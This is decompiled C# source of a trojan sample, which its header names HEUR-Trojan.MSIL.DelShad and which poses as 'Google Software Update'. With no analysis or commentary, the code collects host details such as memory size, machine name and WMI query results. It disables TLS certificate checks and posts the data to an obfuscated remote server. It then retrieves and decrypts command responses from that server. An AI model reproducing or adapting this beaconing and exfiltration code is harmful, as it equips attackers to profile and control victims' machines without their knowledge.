// Decompiled with JetBrains decompiler
// Type: C3904355907.C1801730948
// Assembly: Google Software Update, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1ECCB2B4-E3D0-48EA-84ED-06938D43796B
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan.MSIL.DelShad.gen-b37761715d5a2405a3fa75abccaf6bb15b7298673aaad91a158725be3c518a87.exe

using \u003Cdion2ntty2ic0uyoe\u003E\u007B43570453\u002D3AD8\u002D4A5B\u002DB273\u002D83DF8156D820\u007D;
using Microsoft.VisualBasic.Devices;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.Http;
using System.Net.Security;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Json;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;

namespace C3904355907
{
  public class C1801730948
  {
    public static string C3904355907;
    public static string C1255198513;
    public static string C1908338681;
    public static string C1037565863;
    private static HttpClient C3554254475;
    private string C112844655 = DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.jS();
    private static string C2746444292 = DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.jS();
    public static string C2564639436;

    [CompilerGenerated]
    [SpecialName]
    public string C3554254475() => this.C3554254475;

    public C1801730948([In] string obj0)
    {
      // ISSUE: reference to a compiler-generated field
      this.C3554254475 = obj0;
      C1801730948.C2746444292 = this.C112844655;
    }

    public static string C3904355907() => ((ulong.Parse(new ComputerInfo().TotalPhysicalMemory.ToString()) / 1048576UL).ToString() + DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.BA()).ToString();

    public static string C1255198513()
    {
      object obj = new ManagementObjectSearcher(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.js()).Get().Cast<ManagementObject>().Select<ManagementObject, object>((Func<ManagementObject, object>) (obj0 => obj0.GetPropertyValue(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.Kt()))).FirstOrDefault<object>();
      return obj != null ? obj.ToString() : DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.jT();
    }

    public static void C3554254475([In] string obj0)
    {
      C1801730948.C1037565863 = obj0;
      C1801730948.C3554254475 = !string.IsNullOrEmpty(C1801730948.C3904355907) && !string.IsNullOrEmpty(C1801730948.C2746444292) ? new HttpClient((HttpMessageHandler) new HttpClientHandler()
      {
        ServerCertificateCustomValidationCallback = (Func<HttpRequestMessage, X509Certificate2, X509Chain, SslPolicyErrors, bool>) delegate
        {
          return true;
        }
      })
      {
        BaseAddress = new Uri(C1801730948.C2746444292)
      } : throw new ApplicationException(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.jt());
      C1801730948.C3554254475.DefaultRequestHeaders.Add(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.jU(), DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.ju());
      HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cz())
      {
        Content = (HttpContent) new FormUrlEncodedContent((IEnumerable<KeyValuePair<string, string>>) new Dictionary<string, string>()
        {
          {
            DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.jV(),
            C1801730948.C3904355907
          },
          {
            DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.jv(),
            Environment.MachineName
          },
          {
            DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.jW(),
            C1801730948.C1255198513
          },
          {
            DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.jw(),
            C1801730948.C1908338681
          },
          {
            DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.jX(),
            C1801730948.C1037565863
          },
          {
            DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.jx(),
            C1801730948.C2564639436
          },
          {
            DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.jY(),
            C1801730948.C3904355907()
          },
          {
            DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.jy(),
            C1801730948.C1255198513()
          }
        })
      };
      Task<HttpResponseMessage> task = C1801730948.C3554254475.SendAsync(request);
      if (!task.Result.IsSuccessStatusCode)
        throw new HttpRequestException(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.jZ());
      string result = task.Result.Content.ReadAsStringAsync().Result;
      using (MemoryStream memoryStream = new MemoryStream(Encoding.Unicode.GetBytes(result)))
      {
        if (!((C655174618) new DataContractJsonSerializer(typeof (C655174618)).ReadObject((Stream) memoryStream)).C3554254475())
          ;
      }
    }

    public async Task<C655174618> C1908338681()
    {
      C1801730948.C3554254475 = !string.IsNullOrEmpty(C1801730948.C3904355907) && !string.IsNullOrEmpty(this.C112844655) ? new HttpClient((HttpMessageHandler) new HttpClientHandler()
      {
        ServerCertificateCustomValidationCallback = (Func<HttpRequestMessage, X509Certificate2, X509Chain, SslPolicyErrors, bool>) delegate
        {
          return true;
        }
      })
      {
        BaseAddress = new Uri(this.C112844655)
      } : throw new ApplicationException(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.jt());
      C1801730948.C3554254475.DefaultRequestHeaders.Add(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.jU(), DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.ju());
      HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cz())
      {
        Content = (HttpContent) new FormUrlEncodedContent((IEnumerable<KeyValuePair<string, string>>) new Dictionary<string, string>()
        {
          {
            DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.jV(),
            C1801730948.C3904355907
          },
          {
            DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.jv(),
            Environment.MachineName
          },
          {
            DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.jW(),
            C1801730948.C1255198513
          },
          {
            DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.jw(),
            C1801730948.C1908338681
          }
        })
      };
      HttpResponseMessage httpResponseMessage = await C1801730948.C3554254475.SendAsync(request);
      if (!httpResponseMessage.IsSuccessStatusCode)
        throw new HttpRequestException(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.jZ());
      string s = await httpResponseMessage.Content.ReadAsStringAsync();
      DataContractJsonSerializer contractJsonSerializer = new DataContractJsonSerializer(typeof (C655174618));
      C655174618 c655174618_1;
      using (MemoryStream C3554254475 = new MemoryStream(Encoding.Unicode.GetBytes(s)))
      {
        C655174618 c655174618 = (C655174618) contractJsonSerializer.ReadObject((Stream) C3554254475);
        C1801730948.C2564639436 = c655174618.C1037565863();
        c655174618_1 = c655174618;
      }
      request = (HttpRequestMessage) null;
      httpResponseMessage = (HttpResponseMessage) null;
      s = (string) null;
      contractJsonSerializer = (DataContractJsonSerializer) null;
      return c655174618_1;
    }

    public static string C1037565863()
    {
      C1801730948.C3554254475 = !string.IsNullOrEmpty(C1801730948.C3904355907) && !string.IsNullOrEmpty(C1801730948.C2746444292) ? new HttpClient((HttpMessageHandler) new HttpClientHandler()
      {
        ServerCertificateCustomValidationCallback = (Func<HttpRequestMessage, X509Certificate2, X509Chain, SslPolicyErrors, bool>) delegate
        {
          return true;
        }
      })
      {
        BaseAddress = new Uri(C1801730948.C2746444292.Replace(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.jz(), DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.KA()))
      } : throw new ApplicationException(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.jt());
      C1801730948.C3554254475.DefaultRequestHeaders.Add(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.jU(), DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.ju());
      HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cz());
      Task<HttpResponseMessage> task = C1801730948.C3554254475.SendAsync(request);
      if (!task.Result.IsSuccessStatusCode)
        throw new HttpRequestException(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.jZ());
      string result = task.Result.Content.ReadAsStringAsync().Result;
      string s = DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.Ka();
      byte[] hash = SHA256.Create().ComputeHash(Encoding.ASCII.GetBytes(s));
      byte[] numArray = new byte[16];
      string[] strArray = C3463352047.C3554254475(result, hash, numArray).Split('-');
      C1801730948.C1255198513 = strArray[0];
      C1801730948.C1908338681 = strArray[1];
      return DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cz();
    }
  }
}
